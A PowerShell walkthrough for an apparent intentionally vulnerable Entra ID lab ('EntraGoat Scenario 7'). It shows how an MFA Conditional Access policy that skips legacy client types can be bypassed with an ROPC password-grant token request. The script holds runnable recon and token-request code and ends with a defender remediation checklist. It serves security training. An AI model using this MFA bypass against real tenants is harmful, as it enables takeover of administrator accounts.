<#
.SYNOPSIS
EntraGoat Scenario 7: Walkthrough step-by-step solution

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 7 - "Legacy Loophole: When MFA Forgot the Side Door"

Attack flow:

1. The attacker starts with low-privileged credentials for raj.patel - a mail
systems engineer who knows the tenant still runs an old SMTP relay and
ActiveSync mailboxes for a legacy line-of-business app. Looking at the
admin team, the messaging admin EntraGoat-admin-s7 stands out: a
Helpdesk ticket once reset the account to a predictable password
("Helpdesk!Reset2024") and nobody rotated it.

2. Recon. The attacker enumerates the Conditional Access posture (or just
infers it from sign-in failures during password sprays). The tenant has
a "Require MFA for All Users" policy - on paper, this should stop a
password-only sign-in cold. But the policy's clientAppTypes only covers
'browser' and 'mobileAppsAndDesktopClients'. exchangeActiveSync and
'other' (ROPC, IMAP, POP, SMTP AUTH) are not in scope.

3. Bypass. Resource Owner Password Credentials (ROPC) is the cleanest
legacy-auth surface for password-only sign-in to Entra ID. It is
classified as 'other clients' for Conditional Access purposes and is
not subject to interactive MFA. The attacker sends a direct ROPC
token request with the admin's UPN + password to /oauth2/v2.0/token
against the tenant. The CA policy never fires because the request
never matches a scoped clientAppType.

4. Token in hand, the attacker reads onPremisesExtensionAttributes for
the admin (or for /me, since the token is scoped to the admin) and
recovers the flag from extensionAttribute1.

- - -

--> So... why does this work?

Conditional Access "client app" conditions are an allow-list, not a
deny-all. If a policy author leaves clientAppTypes set to only the
modern-auth values, every legacy-auth path is silently excluded. Even
in the Microsoft portal UI this is the default for new policies until
you flip "Configure" to Yes and explicitly tick the legacy boxes.

Microsoft's published guidance is unambiguous:
* Conditional Access policy template: "Block legacy authentication".
  This is the supported, named control. It blocks Exchange ActiveSync
  clients and Other clients across the tenant.
  https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-block-legacy
* Authentication policies (per-protocol disable for SMTP AUTH,
  POP, IMAP, MAPI, OAB, RPC, ActiveSync, OfflineAddressBook):
  Set-CASMailbox / Set-OrganizationConfig in Exchange Online,
  or the Authentication Methods policy in Entra.
* Sign-in logs: filter on "Client app == Other clients / IMAP4 / POP3
  / SMTP / Exchange ActiveSync" - any non-zero count is the audit
  signal a defender wants before they pull the trigger on the block.

Common reasons admins leave the gap open:
* A line-of-business mailbox uses SMTP AUTH for outbound notifications.
* A scanner or printer on the LAN authenticates via Basic IMAP/POP.
* A scripted job uses ROPC because it predates MSAL.
* A vendor integration claims it "needs basic auth" and the admin
  carved out an exclusion that was never revisited.

In every one of those cases the right answer is the same: scope the
exclusion to the specific service principal or service account, and
keep the tenant-wide block. Anything less and password-only attackers
walk through the side door.
________________________________________________________________________________________________________________________________________________

.NOTES
This walkthrough uses Microsoft Graph PowerShell SDK plus a direct REST
call to the v2.0 token endpoint to demonstrate ROPC. ROPC requires the
MFA requirement to NOT be enforced on the requested user account - which
is exactly what this scenario's misconfiguration produces.
#>


# Configuration settings for convenience
$tenantId = "[YOUR-TENANT-ID]"
$tenantDomain = "[YOUR-TENANT-DOMAIN-NAME].onmicrosoft.com"
$attackerUPN = "raj.patel@$tenantDomain"
$attackerPassword = "GoatAccess!123"
$adminUPN = "EntraGoat-admin-s7@$tenantDomain"
$adminPassword = "Helpdesk!Reset2024"


# Step 1: Initial foothold - sign in as the low-priv user with delegated Graph
Connect-MgGraph -TenantId $tenantId -Scopes "User.Read","Policy.Read.All"
Get-MgContext

# Step 2: Enumerate Conditional Access posture
# Most low-priv users cannot read CA policies directly. The realistic recon
# path is to attempt sign-ins and read sign-in logs they have access to,
# or to infer policy from observed MFA prompts. For lab clarity, if the
# starting identity has Policy.Read.All in your tenant, you can read it
# directly:
Get-MgIdentityConditionalAccessPolicy -All |
    Where-Object { $_.State -eq 'enabled' } |
    Select-Object DisplayName,
                  @{n='ClientAppTypes';e={$_.Conditions.ClientAppTypes -join ','}},
                  @{n='GrantControls';e={$_.GrantControls.BuiltInControls -join ','}}

# Look for any policy whose ClientAppTypes do NOT include 'exchangeActiveSync'
# and 'other'. That is your bypass target.

# Step 3: Find the messaging admin account.
# In a real engagement this comes from OSINT, helpdesk-ticket sniffing, or
# group enumeration. For the lab the admin UPN follows the EntraGoat naming
# convention.
$targetAdmin = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s7')"
$targetAdmin

Disconnect-MgGraph

# Step 4: Password spray over legacy auth (ROPC).
# ROPC is classified as 'Other clients' in Conditional Access. With the
# policy's clientAppTypes scoped to browser + modern desktop/mobile only,
# this request will not match any policy and will not be challenged for
# MFA. It just returns a token if the password is correct.
#
# We use the Microsoft Azure PowerShell first-party client_id so we do not
# need to register a public client in the tenant.
$clientId = "1950a258-227b-4e31-a9cf-717495945fc2"  # Microsoft Azure PowerShell

$body = @{
    grant_type = "password"
    client_id  = $clientId
    username   = $adminUPN
    password   = $adminPassword
    scope      = "https://graph.microsoft.com/.default offline_access"
}

$tokenResponse = Invoke-RestMethod `
    -Method POST `
    -Uri "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token" `
    -ContentType "application/x-www-form-urlencoded" `
    -Body $body

$adminAccessToken = $tokenResponse.access_token

# Notice: no MFA prompt, no Conditional Access redirect. The token came
# back on the first try. That is the gap this scenario teaches.

# Step 5: Use the admin's access token to retrieve the flag.
$headers = @{ Authorization = "Bearer $adminAccessToken" }
Invoke-RestMethod `
    -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me?`$select=id,userPrincipalName,onPremisesExtensionAttributes" `
    -Headers $headers |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

# Congratulations! You have successfully completed the EntraGoat Scenario 7.
# Don't forget to run the cleanup script to restore the tenant to its original state!

# Defender remediation checklist:
#   1. Apply the "Block legacy authentication" Conditional Access template
#      tenant-wide. https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-block-legacy
#   2. In Exchange Online, run Get-CASMailbox / Get-OrganizationConfig to
#      audit which protocols are enabled, and disable SMTP AUTH, POP, IMAP,
#      MAPI, OAB, RPC, ActiveSync wherever business-justified to do so.
#   3. Disable ROPC for first-party clients you do not actively use by
#      restricting allowed grant types in the application's manifest /
#      Authentication Methods policy.
#   4. Audit Sign-in logs for "Client app == Other clients" /
#      "Exchange ActiveSync" / "IMAP4" / "POP3" / "SMTP" - the
#      Microsoft-published Workbook "Sign-ins using Legacy Authentication"
#      is a fast way to see exposure before flipping the block.
#   5. For any application that genuinely needs legacy auth, scope the
#      exclusion to that one service principal, never tenant-wide.
